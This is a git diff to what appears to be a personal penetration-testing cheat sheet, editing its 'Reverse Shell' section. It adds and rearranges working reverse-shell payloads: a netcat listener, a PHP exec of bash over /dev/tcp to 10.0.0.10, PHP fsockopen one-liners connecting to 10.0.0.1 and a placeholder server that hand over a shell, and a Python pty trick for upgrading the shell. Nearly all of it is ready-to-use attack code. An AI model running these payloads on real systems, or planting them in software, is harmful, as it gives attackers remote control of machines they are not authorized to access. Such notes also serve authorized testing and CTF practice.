@@ -45,17 +45,32 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u targetUr
 
 ### Reverse Shell
 
+- receive
+```
+nc -lnvp 1234
+```
+
 - [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc)
 ```php
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
 ```
-```
-nc -lnvp 1234
-```
-- Direct input
-```shell
+  - Direct input
+```php
 php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+- PHP fsockopen
+<?php $s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");?>
+  - Direct input
+```php
+php -r '$s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");'
+```
+
+- when i get "must be run from a terminal"
+```python
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
 ```
 
 ### Privilege escalation
